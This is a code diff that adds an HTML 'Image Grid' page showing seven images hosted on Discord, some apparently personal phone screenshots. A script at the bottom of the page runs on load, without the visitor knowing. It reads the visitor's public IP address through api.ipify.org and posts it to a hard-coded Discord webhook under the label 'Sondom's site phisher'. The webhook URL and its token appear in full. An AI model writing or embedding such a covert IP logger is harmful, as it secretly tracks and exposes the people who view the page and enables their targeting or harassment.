@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Grid</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0; /* Light grey background */
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .container img {
+            width: 100%;
+            height: 75vh; /* 75% of the viewport height */
+            object-fit: cover; /* Ensures images maintain aspect ratio */
+            margin-bottom: 10px;
+        }
+
+        .container img.full-width {
+            width: 100vw; /* Full width of the viewport */
+            height: auto; /* Auto height to maintain aspect ratio */
+        }
+
+        @media (min-width: 600px) {
+            .container img {
+                max-width: 500px; /* Max width on larger screens */
+                height: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://cdn.discordapp.com/attachments/1292159190755840073/1292167298714570852/IMG-20240725-WA0001.jpg?ex=67129213&is=67114093&hm=98c25cea7d311b8c2fc7af576955c4e54c4348da599aad60ca6e3bb86766736a&" alt="Image 1">
+        <img src="https://cdn.discordapp.com/attachments/1292159190755840073/1292501560353488969/image.png?ex=671277e1&is=67112661&hm=5bec21862f25183da25cb6aad007e7d7e93d040dbeec9608c391d5682c2e565b&" alt="Image 2">
+        <img src="https://cdn.discordapp.com/attachments/1292159190755840073/1292581647988031548/Screenshot_20241006-211702_Snapchat.jpg?ex=671219b7&is=6710c837&hm=d4d42295ccf31f75179e3f3669e7ea4888bf71b1ce50a777a7087bfdf4708c49&" alt="Image 3">
+        <img src="https://cdn.discordapp.com/attachments/1292159190755840073/1296539924161630269/image.png?ex=6712a866&is=671156e6&hm=376990f9b409ec1c54a0b9fa5e4b9aad8571c9b81121fe876b97e3893ee323eb&" alt="Image 4">
+        <img src="https://cdn.discordapp.com/attachments/1292159190755840073/1296539975516553328/image.png?ex=6712a872&is=671156f2&hm=0c25669847219730a156d7c8f869160c1ee32a21b91f1ab0ef75a4ae3b23f457&" alt="Image 5" style="max-width: 600px;">
+        <img src="https://cdn.discordapp.com/attachments/1292159190755840073/1292159576992649236/Screenshot_20240919-235751_Discord.jpg?ex=67128ae2&is=67113962&hm=2d0f7ad9a9a97f3d1fd33f882cee07f0b17a5d678c1920ecfd9af0e95062b55d&" alt="Image 6">
+        <img class="full-width" src="https://cdn.discordapp.com/attachments/1292159190755840073/1292501224041746493/image.png?ex=67127791&is=67112611&hm=a87b147e4dc320af657ca948cdf16e9d01c3829ae067064c86b6462c5572a7c3&" alt="Image 7">
+    </div>
+
+    <script>
+      fetch('https://api.ipify.org')
+      .then((res) => res.text())  
+        .then(ip => {
+          const userIp = ip
+          var request = new XMLHttpRequest();
+          request.open("POST", "https://discord.com/api/webhooks/1292169702461669467/b0C-bg76frF4FLSAiZE_guw6kp_w4dQVnJu6a-gGVxgDhGmv3rsZSiI8AuZNVp2wIFZ"); // add 8 to the end
+          request.setRequestHeader('Content-type', 'application/json');
+
+          var myEmbed2 = {
+            author: {
+              name: "Sondom's site phisher"
+            },
+            title: "USER DETECTED",
+            description: `User detected on the **Home Page** with the ip \`${userIp}\``,
+            color: hexToDecimal("#00FF00")
+          }
+
+          var params = {
+            username: "Sondom's site phisher",
+            content: "A user has been detected",
+            embeds: [ myEmbed2 ]
+          }
+
+          request.send(JSON.stringify(params));
+
+          function hexToDecimal(hex) {
+            return parseInt(hex.replace("#",""), 16)
+          }
+        })
+  </script>
+</body>
+</html>
